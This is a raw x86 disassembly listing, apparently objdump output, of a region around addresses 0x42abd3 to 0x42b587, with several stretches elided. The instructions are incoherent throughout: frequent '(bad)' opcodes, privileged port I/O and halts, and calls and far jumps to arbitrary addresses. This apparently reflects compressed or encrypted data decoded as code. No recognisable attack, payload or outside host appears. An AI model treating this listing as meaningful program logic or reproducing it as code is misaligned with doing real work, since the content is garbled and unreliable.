  42abd3:	push   0xffffffbd
  42abd5:	inc    eax
  42abd6:	adc    DWORD PTR [ebx+eax*1],esp
  42abd9:	pop    edi
  42abda:	(bad)  
  42abdc:	jns    0x42ac14
  42abde:	lahf   
  42abdf:	es mov dh,0xb3
  42abe2:	adc    ebx,DWORD PTR [ecx-0x32ba34d3]
  42abe8:	pop    esp
  42abe9:	in     al,0x66
  42abeb:	cs aam 0x74
  42abee:	sahf   
  42abef:	out    0x1b,eax
  42abf1:	or     edx,DWORD PTR [edi+ecx*2+0x7b46e69b]
  42abf8:	cmp    ebp,edi
  42abfa:	inc    edx
  42abfb:	rcl    BYTE PTR [eax],cl
  42abfd:	imul   eax,DWORD PTR [eax],0xaf070790
  42ac03:	into   
  42ac04:	add    edi,DWORD PTR [eax+ebp*1-0x5c51632c]
  42ac0b:	xlat   BYTE PTR ds:[ebx]
  42ac0c:	repnz xchg ebp,eax
  42ac0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac0f:	mov    ds:0xa4dcc6b,eax
  42ac14:	rcr    BYTE PTR [eax],0x99
  42ac17:	pop    edi
  42ac18:	pop    eax
  42ac19:	xchg   al,al
  42ac1b:	cmp    BYTE PTR [ecx+0x1a],0xfb
  42ac1f:	dec    esi
  42ac20:	pusha  
  42ac21:	inc    edi
  42ac22:	(bad)  
  42ac23:	ins    DWORD PTR es:[edi],dx
  42ac24:	cld    
  42ac25:	pop    esi
  42ac26:	sti    
  42ac27:	sbb    eax,0x2edccd42
  42ac2c:	ds in  al,0x2d
  42ac2f:	jl     0x42ac53
  42ac31:	retf   0x2382
  42ac34:	adc    esp,DWORD PTR [edi]
  42ac36:	int3   
  42ac37:	and    ah,ch
  42ac39:	jge    0x42abd9
  42ac3b:	pusha  
  42ac3c:	mov    ah,0x96
  42ac3e:	inc    esi
  42ac3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac40:	xchg   edi,eax
  42ac41:	lea    ebp,[ebx-0x6b]
  42ac44:	stc    
  42ac45:	int3   
  42ac46:	leave  
  42ac47:	xor    eax,0xd667bbe
  42ac4c:	dec    ebx
  42ac4d:	push   esi
  42ac4e:	inc    ebx
  42ac4f:	mov    ds:0x18fb6fc9,al
  42ac54:	mov    ds:0x5f841f59,al
  42ac59:	jbe    0x42ac8e
  42ac5b:	sahf   
  42ac5c:	into   
  42ac5d:	in     eax,0xf7
  42ac5f:	test   esi,ebx
  42ac61:	call   0x19c341a2
  42ac66:	mov    edi,0x6389d9e5
  42ac6b:	sub    BYTE PTR [ecx],dh
  42ac6d:	out    0x94,eax
  42ac6f:	adc    BYTE PTR [ebp-0x53],bh
  42ac72:	retf   0x9831
  42ac75:	pusha  
  42ac76:	mov    ecx,0x30e1aa81
  42ac7b:	lods   al,BYTE PTR ds:[esi]
  42ac7c:	sub    al,0x9f
  42ac7e:	sbb    edx,DWORD PTR [ebx-0x4079e16e]
  42ac84:	dec    edx
  42ac85:	pop    ds
  42ac86:	stos   DWORD PTR es:[edi],eax
  42ac87:	xor    eax,ebp
  42ac89:	sub    DWORD PTR [ebp-0x31c0f0d],0x3e
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	mov    edi,0xac256d9d
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	fcomp  DWORD PTR [edx+0x22]
  42ad0f:	test   BYTE PTR [ebp+0x5f9a289b],0xc
  42ad16:	enter  0xb1aa,0x54
  42ad1a:	pushf  
  42ad1b:	scas   eax,DWORD PTR es:[edi]
  42ad1c:	sub    BYTE PTR [eax+0x3e],cl
  42ad1f:	mov    esi,0xa56d1db7
  42ad24:	aaa    
  42ad25:	mov    dl,0xd3
  42ad27:	ret    
  42ad28:	je     0x42acbd
  42ad2a:	sub    eax,0x5ae4c51
  42ad2f:	ja     0x42ad7f
  42ad31:	cmc    
  42ad32:	or     edx,DWORD PTR [edx-0x34]
  42ad35:	mov    BYTE PTR gs:[eax+0x16adfa81],bh
  42ad3c:	pop    edx
  42ad3d:	sbb    BYTE PTR [ecx-0x5a00094a],ch
  42ad43:	shr    DWORD PTR [ebp+0xf],1
  42ad46:	in     al,dx
  42ad47:	js     0x42ad5a
  42ad49:	int3   
  42ad4a:	cs (bad) 
  42ad4c:	cmp    eax,0xdb1b21ac
  42ad51:	sbb    eax,0x9ce99704
  42ad56:	xor    edx,DWORD PTR [ebp-0x34a011b0]
  42ad5c:	add    dh,BYTE PTR [ecx]
  42ad5e:	ret    0x18cc
  42ad61:	lock add ah,BYTE PTR [eax+esi*8+0x59743c55]
  42ad69:	add    dh,0x71
  42ad6c:	or     ah,dh
  42ad6e:	inc    edx
  42ad6f:	push   0x2fc9c20e
  42ad74:	hlt    
  42ad75:	fisubr WORD PTR [ebp+0x5c]
  42ad78:	mov    cl,0x20
  42ad7a:	inc    esp
  42ad7b:	pop    ebx
  42ad7c:	xlat   BYTE PTR ds:[ebx]
  42ad7d:	into   
  42ad7e:	pop    esp
  42ad7f:	pop    eax
  42ad80:	int    0xfe
  42ad82:	popf   
  42ad83:	retw   0xb071
  42ad87:	xchg   edi,eax
  42ad88:	sahf   
  42ad89:	imul   ebx,DWORD PTR [ecx+0x7d2bc150],0x68
  42ad90:	jmp    0xcc3919fe
  42ad95:	dec    edx
  42ad96:	in     al,0x91
  42ad98:	cdq    
  42ad99:	test   al,0x50
  42ad9b:	cs inc ebx
  42ad9d:	cmp    ch,ah
  42ad9f:	sub    eax,DWORD PTR [ecx]
  42ada1:	and    eax,0xa05a93af
  42ada6:	mov    ds:0x9afc3b31,al
  42adab:	jb     0x42ad7f
  42adad:	jb     0x42ad57
  42adaf:	aad    0x78
  42adb1:	ins    DWORD PTR es:[edi],dx
  42adb2:	clc    
  42adb3:	out    dx,eax
  42adb4:	jg     0x42ada4
  42adb6:	mov    edx,0x6ff77646
  42adbb:	push   edx
  42adbc:	sub    al,0xe4
  42adbe:	shr    BYTE PTR [eax],1
  42adc0:	jae    0x42ad54
  42adc2:	inc    ebp
  42adc3:	sub    eax,0x4c8c26ee
  42adc8:	gs pop esp
  42adca:	jns    0x42adc0
  42adcc:	loopne 0x42ae1a
  42adce:	test   al,0xb7
  42add0:	mov    cl,0xf4
  42add2:	pushf  
  42add3:	xchg   esi,eax
  42add4:	jp     0x42ad9f
  42add6:	test   bl,dl
  42add8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42add9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adda:	js     0x42ad98
  42addc:	imul   edi,DWORD PTR [edi],0xfffffff1
  42addf:	in     eax,dx
  42ade0:	sar    esi,1
  42ade2:	mov    ebx,0x1166505
  42ade7:	hlt    
  42ade8:	aad    0xcc
  42adea:	mov    dl,0xd
  42adec:	inc    esi
  42aded:	pop    esp
  42adee:	pop    edi
  42adef:	sbb    ch,ch
  42adf1:	std    
  42adf2:	mov    ebx,0x2f065ccb
  42adf7:	ret    0xe8e8
  42adfa:	out    dx,al
  42adfb:	push   ebx
  42adfc:	stos   DWORD PTR es:[edi],eax
  42adfd:	hlt    
  42adfe:	push   esp
  42adff:	mov    eax,ds:0x76d6d79a
  42ae04:	call   0x251cdad6
  42ae09:	xor    edx,DWORD PTR [eax-0x68e72e10]
  42ae0f:	pop    esp
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	mov    al,ds:0xb0a56f83
  42ae85:	retf   0x1
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	into   
  42ae8d:	sub    al,0x5a
  42ae8f:	clc    
  42ae90:	mov    DWORD PTR [eax-0x2e],eax
  42ae93:	into   
  42ae94:	js     0x42af08
  42ae96:	mov    DWORD PTR [eax+eiz*2],ebx
  42ae99:	rcr    BYTE PTR [eax+0x41bd84e5],cl
  42ae9f:	sub    cl,bh
  42aea1:	dec    ecx
  42aea2:	ret    
  42aea3:	xor    ah,ah
  42aea5:	add    edx,eax
  42aea7:	mov    bl,0xa
  42aea9:	mov    WORD PTR [ecx+0x29],ss
  42aeac:	cwde   
  42aead:	pushf  
  42aeae:	xchg   BYTE PTR [esi],al
  42aeb0:	or     dh,dh
  42aeb2:	sbb    ch,dh
  42aeb4:	mov    ds:0x60e91521,eax
  42aeb9:	sub    DWORD PTR [esi-0x71],esp
  42aebc:	ds fs loop 0x42ae81
  42aec0:	cmp    cl,BYTE PTR [ecx]
  42aec2:	adc    ebx,DWORD PTR [edi-0x223bb6e8]
  42aec8:	test   al,0x5a
  42aeca:	dec    ecx
  42aecb:	xchg   DWORD PTR [ebp-0x42],esi
  42aece:	add    DWORD PTR [eax],0xffffffc9
  42aed1:	cmp    eax,DWORD PTR [ebp+0x3d]
  42aed4:	sub    DWORD PTR [ecx+0x251a0852],eax
  42aeda:	jecxz  0x42aebf
  42aedc:	jecxz  0x42aefb
  42aede:	xor    al,0xea
  42aee0:	or     dl,bh
  42aee2:	sti    
  42aee3:	outs   dx,DWORD PTR ds:[esi]
  42aee4:	mov    al,0xc5
  42aee6:	or     eax,0xbe5de4a
  42aeeb:	loope  0x42ae8d
  42aeed:	cmp    BYTE PTR [edi],al
  42aeef:	pop    ss
  42aef0:	cdq    
  42aef1:	inc    esp
  42aef2:	inc    ebx
  42aef3:	inc    esp
  42aef4:	mov    DWORD PTR [edi],edi
  42aef6:	loope  0x42af11
  42aef8:	pop    ebp
  42aef9:	ss cli 
  42aefb:	out    0x61,eax
  42aefd:	xchg   ebp,eax
  42aefe:	inc    edi
  42aeff:	int    0xca
  42af01:	cmp    ecx,edx
  42af03:	adc    al,0x7f
  42af05:	fdiv   st(7),st
  42af07:	mov    bh,BYTE PTR [edx+0x1f]
  42af0a:	jecxz  0x42aeba
  42af0c:	push   ebp
  42af0d:	cmp    ecx,eax
  42af0f:	sahf   
  42af10:	call   0x9c68536b
  42af15:	aas    
  42af16:	jge    0x42af1f
  42af18:	pop    ebx
  42af19:	push   ss
  42af1a:	or     ebx,DWORD PTR [edi+0x58]
  42af1d:	xchg   DWORD PTR [ebx],edi
  42af1f:	popa   
  42af20:	in     eax,0xbd
  42af22:	push   edi
  42af23:	pop    ds
  42af24:	adc    DWORD PTR ds:0x9a1b8074,esi
  42af2a:	test   ah,dl
  42af2c:	cmc    
  42af2d:	addr16 or al,0xe5
  42af30:	clc    
  42af31:	sbb    al,BYTE PTR [eax]
  42af33:	gs push cs
  42af35:	pop    esp
  42af36:	fwait
  42af37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af38:	cmp    al,0x70
  42af3a:	xor    DWORD PTR [eax],ebx
  42af3c:	inc    edx
  42af3d:	fwait
  42af3e:	int3   
  42af3f:	mov    ds:0x44196863,al
  42af44:	aas    
  42af45:	(bad)  
  42af46:	pop    ds
  42af47:	std    
  42af48:	in     al,0x63
  42af4a:	sub    dh,BYTE PTR [edi]
  42af4c:	es mov ecx,0xf29276e1
  42af52:	rcr    BYTE PTR [esi+0x9891623],0x79
  42af59:	paddusb mm5,QWORD PTR [ebp-0x4d602f95]
  42af60:	ffree  st(3)
  42af62:	sub    DWORD PTR [edi-0x69dcd445],ebp
  42af68:	in     eax,0x9e
  42af6a:	sar    DWORD PTR [ecx+0x44],0x33
  42af6e:	mov    esi,0x5f63e144
  42af73:	xchg   DWORD PTR fs:0x454019b2,ebx
  42af7a:	jne    0x42af30
  42af7c:	cbw    
  42af7e:	fwait
  42af7f:	or     edx,DWORD PTR [edi+eiz*2]
  42af82:	push   edi
  42af83:	sbb    BYTE PTR [ebx],bh
  42af85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af86:	push   ds
  42af87:	push   cs
  42af88:	adc    ch,al
  42af8a:	in     eax,0x7c
  42af8c:	mov    al,ds:0x5175a8
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	repz jecxz 0x42b06f
  42b003:	hlt    
  42b004:	mov    ah,0xcb
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	ja     0x42afbf
  42b00e:	xchg   ebx,eax
  42b00f:	pushf  
  42b010:	clc    
  42b011:	cmp    al,0xce
  42b013:	sbb    DWORD PTR [ebp+0x4879c1eb],esi
  42b019:	and    eax,0xc539e366
  42b01e:	int    0x66
  42b020:	inc    edi
  42b021:	(bad)  
  42b022:	out    dx,eax
  42b023:	dec    edx
  42b024:	ds mov ecx,0x4c8c4487
  42b02a:	in     eax,dx
  42b02b:	lods   eax,DWORD PTR ds:[esi]
  42b02c:	lods   eax,DWORD PTR ds:[esi]
  42b02d:	jb     0x42b098
  42b02f:	cmp    ah,BYTE PTR ds:0xdfe68e52
  42b035:	xor    BYTE PTR [edi],0x8f
  42b038:	enter  0xd5d7,0xff
  42b03c:	mov    al,ds:0xe2f5d645
  42b041:	pushf  
  42b042:	pushf  
  42b043:	sub    DWORD PTR [edi-0xb],edx
  42b046:	mov    dh,0xde
  42b048:	mov    bl,0xdc
  42b04a:	jne    0x42affc
  42b04c:	fprem  
  42b04e:	scas   al,BYTE PTR es:[edi]
  42b04f:	enter  0xa822,0xf5
  42b053:	add    BYTE PTR [esi],cl
  42b055:	test   eax,0x8fc78649
  42b05a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42b05c:	lock xchg esi,eax
  42b05e:	mov    DWORD PTR [ecx],edx
  42b060:	xchg   esi,eax
  42b061:	sbb    DWORD PTR [edi],ebp
  42b063:	sub    al,BYTE PTR [eax-0x608334e5]
  42b069:	dec    ebp
  42b06a:	lahf   
  42b06b:	pop    ebp
  42b06c:	mov    esi,0x6c6df6c6
  42b071:	aad    0x1c
  42b073:	pop    edx
  42b074:	fmul   DWORD PTR [ebx+ecx*2-0x51]
  42b078:	jnp    0x42b03c
  42b07a:	and    al,BYTE PTR [ebp-0xaf7237e]
  42b080:	ror    al,0x15
  42b083:	sub    ebp,0xffffffed
  42b086:	in     al,0x6d
  42b088:	call   0xcbf447b6
  42b08d:	shr    bh,1
  42b08f:	jmp    0xc4c9:0x9eb43938
  42b096:	xchg   DWORD PTR [edx],eax
  42b098:	sbb    BYTE PTR [esi],al
  42b09a:	mov    al,0x91
  42b09c:	(bad)  
  42b09d:	jg     0x42b07f
  42b09f:	mov    ah,0x24
  42b0a1:	test   eax,0xc8e39955
  42b0a6:	pusha  
  42b0a7:	imul   eax,DWORD PTR [edi+0x53],0x53
  42b0ab:	cmp    eax,0xbe605620
  42b0b0:	int    0x3d
  42b0b2:	adc    eax,0x404ee7c7
  42b0b7:	icebp  
  42b0b8:	cld    
  42b0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0ba:	(bad)  
  42b0bb:	xchg   ebx,eax
  42b0bc:	in     eax,dx
  42b0bd:	pop    ss
  42b0be:	loopne 0x42b127
  42b0c0:	ret    
  42b0c1:	push   0xf36d9879
  42b0c6:	push   edx
  42b0c7:	pusha  
  42b0c8:	mov    esp,0xb0554fc4
  42b0cd:	loop   0x42b13a
  42b0cf:	das    
  42b0d0:	pop    es
  42b0d1:	inc    edi
  42b0d2:	retf   0x4230
  42b0d5:	mov    esi,DWORD PTR [eax+0x4c]
  42b0d8:	mov    ds:0xda3c22d7,eax
  42b0dd:	aad    0xbb
  42b0df:	out    dx,eax
  42b0e0:	add    eax,eax
  42b0e2:	sahf   
  42b0e3:	cmp    eax,0xe36f9455
  42b0e8:	hlt    
  42b0e9:	pop    es
  42b0ea:	push   es
  42b0eb:	fiadd  WORD PTR [ecx+0x4605f5]
  42b0f1:	not    al
  42b0f3:	jmp    0x42b104
  42b0f5:	dec    ebp
  42b0f6:	sbb    BYTE PTR ds:0x392f1fcd,0x1
  42b0fd:	mov    bh,0x88
  42b0ff:	daa    
  42b100:	push   edx
  42b101:	jnp    0x42b11f
  42b103:	xor    al,0x2d
  42b105:	test   DWORD PTR [ebp+0x1b841b7],0x253520df
  42b10f:	add    eax,0x0
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	fmul   QWORD PTR [ecx+eax*1]
  42b183:	mov    DWORD PTR [eax+0x40001cc],edi
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    BYTE PTR [esp+esi*1-0x5828a380],dh
  42b192:	cmp    DWORD PTR [ecx-0x6adfac7a],eax
  42b198:	jo     0x42b1ca
  42b19a:	add    eax,0x8b87a4af
  42b19f:	into   
  42b1a0:	test   DWORD PTR [edi-0x38],ecx
  42b1a3:	push   ebp
  42b1a4:	call   DWORD PTR [edx+eax*1+0x61]
  42b1a8:	(bad)  
  42b1a9:	pushf  
  42b1aa:	icebp  
  42b1ab:	push   esp
  42b1ac:	mov    bh,0xcd
  42b1ae:	adc    cl,BYTE PTR [eax+0x19]
  42b1b1:	sahf   
  42b1b2:	inc    esp
  42b1b3:	mov    dh,0xaf
  42b1b5:	loopne 0x42b1e7
  42b1b7:	test   al,0x75
  42b1b9:	(bad)  
  42b1ba:	lahf   
  42b1bb:	fist   DWORD PTR [ebx]
  42b1bd:	outs   dx,DWORD PTR ds:[esi]
  42b1be:	sbb    al,0xe0
  42b1c0:	pop    ss
  42b1c1:	icebp  
  42b1c2:	int3   
  42b1c3:	jo     0x42b217
  42b1c5:	mov    ebp,0xa5d8c84e
  42b1ca:	add    esi,DWORD PTR [ebx+0x390e7aeb]
  42b1d0:	test   BYTE PTR [edi],dh
  42b1d2:	xchg   edi,eax
  42b1d3:	or     al,0x0
  42b1d5:	add    dh,dh
  42b1d7:	mov    cl,0xe
  42b1d9:	lods   eax,DWORD PTR ds:[esi]
  42b1da:	pop    ds
  42b1db:	xchg   BYTE PTR gs:[eax-0xd],cl
  42b1df:	xor    eax,0x809fcaca
  42b1e4:	xchg   ebp,eax
  42b1e5:	dec    ebp
  42b1e6:	or     esi,DWORD PTR [eax]
  42b1e8:	mov    bl,BYTE PTR [edx]
  42b1ea:	lahf   
  42b1eb:	mov    ebx,0x39e0dea0
  42b1f0:	push   edi
  42b1f1:	pop    edx
  42b1f2:	les    esp,FWORD PTR [edi-0x7f]
  42b1f5:	pushf  
  42b1f6:	test   al,0xf3
  42b1f8:	mov    edx,0x44dc8ad7
  42b1fd:	pop    esi
  42b1fe:	mov    BYTE PTR [edi+0xf],cl
  42b201:	sub    esi,eax
  42b203:	int3   
  42b204:	imul   edi,DWORD PTR [esi-0x15d44ebc],0x193ad069
  42b20e:	fsub   DWORD PTR [eax+edi*1-0x66ccf4a4]
  42b215:	mov    DWORD PTR [edi-0x3f],esp
  42b218:	js     0x42b233
  42b21a:	stos   DWORD PTR es:[edi],eax
  42b21b:	lods   eax,DWORD PTR ds:[esi]
  42b21c:	(bad)  
  42b21d:	call   DWORD PTR [edi+0x54]
  42b220:	jns    0x42b1f3
  42b222:	inc    edx
  42b223:	sbb    DWORD PTR [eax-0x48a0da86],ebx
  42b229:	pop    esp
  42b22a:	mov    WORD PTR [ebp-0x33],cs
  42b22d:	aad    0xee
  42b22f:	adc    al,0x74
  42b231:	mov    ecx,0x8c6d5929
  42b236:	int3   
  42b237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b238:	or     al,0x34
  42b23a:	imul   esi,DWORD PTR [edi*8+0x3ed1674a],0x36
  42b242:	sbb    al,0x36
  42b244:	pop    esi
  42b245:	push   0x62
  42b247:	mov    dl,0x26
  42b249:	adc    ah,dl
  42b24b:	mov    dh,0x6e
  42b24e:	repnz data16 stc 
  42b251:	xchg   ebx,eax
  42b252:	add    eax,0xe845b3f2
  42b257:	clc    
  42b258:	imul   edx,DWORD PTR [ecx+0x78],0x63
  42b25c:	shl    BYTE PTR [edx-0x43],0x55
  42b260:	fcomp  QWORD PTR [edi]
  42b262:	int3   
  42b263:	lods   al,BYTE PTR ds:[esi]
  42b264:	bound  esi,QWORD PTR ds:0xfdf27943
  42b26a:	lahf   
  42b26b:	js     0x42b210
  42b26d:	dec    edi
  42b26e:	mov    ah,0x8a
  42b270:	pop    esi
  42b271:	mov    BYTE PTR [esi],dh
  42b273:	lds    ecx,FWORD PTR [edi]
  42b275:	mov    esp,0xea9c8e13
  42b27a:	add    al,0x41
  42b27c:	and    BYTE PTR [edi],bl
  42b27e:	js     0x42b2f4
  42b280:	out    0x8a,al
  42b282:	int3   
  42b283:	in     al,dx
  42b284:	dec    ebx
  42b285:	lods   al,BYTE PTR ds:[esi]
  42b286:	fwait
  42b287:	fs mov eax,0xa009b447
  42b28d:	cli    
  42b28e:	rol    DWORD PTR ds:[eax],1
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0xb2738e65
  42b301:	add    BYTE PTR es:[eax],bh
  42b304:	mov    esp,0x40001cd
  42b309:	add    DWORD PTR [eax],eax
  42b30b:	add    BYTE PTR [esi+0x402375e8],ch
  42b311:	mov    esi,0x631b47d2
  42b316:	push   edx
  42b317:	out    dx,al
  42b318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b319:	sar    DWORD PTR [ecx+ecx*1-0x37],1
  42b31d:	mov    bh,0xab
  42b31f:	adc    al,0xc6
  42b321:	dec    ecx
  42b322:	lods   al,BYTE PTR ds:[esi]
  42b323:	in     al,dx
  42b324:	std    
  42b325:	adc    al,0x32
  42b327:	xchg   esp,eax
  42b328:	std    
  42b329:	mov    al,ds:0xb4d2ac71
  42b32e:	dec    ebx
  42b32f:	pop    ecx
  42b330:	lock pop esi
  42b332:	scas   eax,DWORD PTR es:[edi]
  42b333:	mov    esp,0x87ec4b2b
  42b338:	xor    esi,eax
  42b33a:	out    dx,al
  42b33b:	adc    BYTE PTR [ecx],ch
  42b33d:	mov    DWORD PTR [ebp-0x3a],ebx
  42b340:	out    dx,eax
  42b341:	dec    edx
  42b342:	data16 fild WORD PTR [edi-0x4d8240ce]
  42b349:	cli    
  42b34a:	sub    ebx,DWORD PTR [esi-0x5e0f89a0]
  42b350:	inc    edi
  42b351:	jmp    0x42b369
  42b353:	dec    ebx
  42b354:	adc    ch,BYTE PTR [ebx+0x6d64789b]
  42b35a:	aaa    
  42b35b:	sub    ebp,DWORD PTR [edi+0x41]
  42b35e:	neg    DWORD PTR [ebx+0x3ae573b]
  42b364:	test   al,0x1
  42b366:	scas   al,BYTE PTR es:[edi]
  42b367:	mov    cl,0xfd
  42b369:	stc    
  42b36a:	les    ebp,FWORD PTR [ebp-0x2c]
  42b36d:	out    dx,al
  42b36e:	ror    bl,0xa7
  42b371:	jno    0x42b32a
  42b373:	xor    eax,0xa5c77717
  42b378:	pushf  
  42b379:	ds das 
  42b37b:	ret    
  42b37c:	data16 mov gs:0x60dcdf3a,al
  42b383:	and    eax,0x7be3d3e6
  42b388:	xor    eax,0xb3275b1c
  42b38d:	dec    ebx
  42b38e:	adc    BYTE PTR [esi+esi*8-0xf],bh
  42b392:	ret    
  42b393:	cli    
  42b394:	enter  0xbba8,0x5
  42b398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b399:	mov    ds:0x7759c579,eax
  42b39e:	in     al,dx
  42b39f:	pop    ecx
  42b3a0:	mov    cl,0x91
  42b3a2:	jle    0x42b402
  42b3a4:	pop    esi
  42b3a5:	popa   
  42b3a6:	and    DWORD PTR ds:[edx+0x3e],esp
  42b3aa:	daa    
  42b3ab:	jge    0x42b402
  42b3ad:	je     0x42b39d
  42b3af:	sahf   
  42b3b0:	stos   DWORD PTR es:[edi],eax
  42b3b1:	call   0xa9330560
  42b3b6:	mov    eax,ds:0x2a549697
  42b3bb:	sbb    al,0xff
  42b3bd:	adc    edi,edx
  42b3bf:	push   ecx
  42b3c0:	retf   
  42b3c1:	cmp    ebx,DWORD PTR [esi+0xe493387]
  42b3c7:	pop    esi
  42b3c8:	rep ins BYTE PTR es:[edi],dx
  42b3ca:	jb     0x42b3e7
  42b3cc:	mov    BYTE PTR [ecx-0x56],cl
  42b3cf:	out    0x87,eax
  42b3d1:	jle    0x42b429
  42b3d3:	addr16 mov esp,0xe32db89
  42b3d9:	cmp    esp,0x17b4dea
  42b3df:	out    0x38,al
  42b3e1:	aam    0x9a
  42b3e3:	int    0xf6
  42b3e5:	mov    edi,0xecc1d558
  42b3ea:	inc    ecx
  42b3eb:	inc    ecx
  42b3ec:	lods   eax,DWORD PTR ds:[esi]
  42b3ed:	push   cs
  42b3ee:	fisub  DWORD PTR [ebp+0x46b9b81f]
  42b3f4:	mov    eax,0xb29a2f68
  42b3f9:	shr    DWORD PTR ds:0xe033747e,cl
  42b3ff:	add    DWORD PTR [edi+0x3d],ecx
  42b402:	add    eax,esp
  42b404:	sub    DWORD PTR [ebx+0x6b],esi
  42b407:	push   ds
  42b408:	sti    
  42b409:	fdivr  DWORD PTR [edx]
  42b40b:	push   ds
  42b40c:	mov    ah,0x23
  42b40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b40f:	stos   BYTE PTR es:[edi],al
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [eax],esi
  42b481:	or     DWORD PTR [ebp+0x1cec0f0],eax
  42b487:	add    BYTE PTR [ecx+eax*1],al
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	pusha  
  42b48d:	jb     0x42b434
  42b48f:	ins    DWORD PTR es:[edi],dx
  42b490:	xor    esp,DWORD PTR [edx-0x164ff9c5]
  42b496:	cld    
  42b497:	mov    ds:0x82cb3130,al
  42b49c:	lahf   
  42b49d:	sub    ah,BYTE PTR [edx-0x346fdc97]
  42b4a3:	into   
  42b4a4:	xor    eax,0xf2907dd
  42b4a9:	adc    al,0x16
  42b4ab:	imul   edi,DWORD PTR [ecx-0x1f],0x675b5c54
  42b4b2:	mov    esp,0xe36bd91
  42b4b7:	jbe    0x42b4c7
  42b4b9:	pop    edx
  42b4ba:	cmp    DWORD PTR [edi+0x2b],edx
  42b4bd:	or     BYTE PTR [edi+edi*8],al
  42b4c0:	sub    BYTE PTR [esi+0x4be548e4],al
  42b4c6:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42b4c8:	ss mov dh,0xcb
  42b4cb:	ins    DWORD PTR es:[edi],dx
  42b4cc:	adc    ebx,edi
  42b4ce:	jo     0x42b523
  42b4d0:	outs   dx,DWORD PTR ds:[esi]
  42b4d1:	pop    ecx
  42b4d3:	or     ebp,DWORD PTR [esi+ecx*1]
  42b4d6:	jae    0x42b4de
  42b4d8:	fnsave ds:0xcc2db899
  42b4de:	mov    edi,0xc59c1563
  42b4e3:	jle    0x42b54d
  42b4e5:	pop    ebp
  42b4e6:	rol    DWORD PTR [ebp+0x495976f6],1
  42b4ec:	test   al,0x8a
  42b4ee:	sub    eax,0xbe67731
  42b4f3:	ror    DWORD PTR [esi-0x107faf63],1
  42b4f9:	sbb    bh,BYTE PTR [ecx]
  42b4fb:	rcr    DWORD PTR [eax-0x129710a9],0x2b
  42b502:	inc    eax
  42b503:	jmp    0xfce5:0xcd5452f5
  42b50a:	aam    0x6e
  42b50c:	mov    esi,0x233f3e70
  42b511:	hlt    
  42b512:	lock enter 0x7099,0xcd
  42b517:	jmp    0xad99f05f
  42b51c:	pop    esp
  42b51d:	and    ch,BYTE PTR ds:0xf5d2cabe
  42b523:	arpl   WORD PTR [edi-0x4aad6f26],dx
  42b529:	in     eax,0xac
  42b52b:	out    dx,eax
  42b52c:	ror    DWORD PTR [esi],0x1e
  42b52f:	stos   BYTE PTR es:[edi],al
  42b530:	mov    DWORD PTR [esi],esp
  42b532:	push   ebp
  42b533:	jecxz  0x42b500
  42b535:	push   edi
  42b536:	ret    0x18f3
  42b539:	adc    al,0xb7
  42b53b:	lahf   
  42b53c:	or     edx,DWORD PTR [edx-0x33]
  42b53f:	inc    ebx
  42b540:	and    eax,0x33ad28a
  42b545:	addr16 xor dh,dl
  42b548:	out    dx,eax
  42b549:	lock and al,0x60
  42b54c:	lock outs dx,BYTE PTR ds:[esi]
  42b54e:	sti    
  42b54f:	out    0xed,eax
  42b551:	std    
  42b552:	mov    al,ds:0x11b0750b
  42b557:	daa    
  42b558:	retf   0x4497
  42b55b:	inc    esp
  42b55c:	or     ebp,0xffffffb2
  42b55f:	scas   eax,DWORD PTR es:[edi]
  42b560:	cmp    eax,0x9f5ae98b
  42b565:	inc    edx
  42b566:	clc    
  42b567:	cwde   
  42b568:	push   edi
  42b569:	pop    eax
  42b56a:	cmp    cl,BYTE PTR [esi]
  42b56c:	sub    al,0x4a
  42b56e:	and    ebp,DWORD PTR [eax-0x48be61b8]
  42b574:	push   ebx
  42b575:	(bad)  
  42b576:	xor    BYTE PTR [ebp-0x52],dl
  42b579:	imul   ebp,DWORD PTR [ecx-0x37f9cbc8],0x36
  42b580:	cmp    esp,eax
  42b582:	cmp    BYTE PTR [edi-0x18],0xb6
  42b586:	push   edi
  42b587:	stos   BYTE PTR es:[edi],al
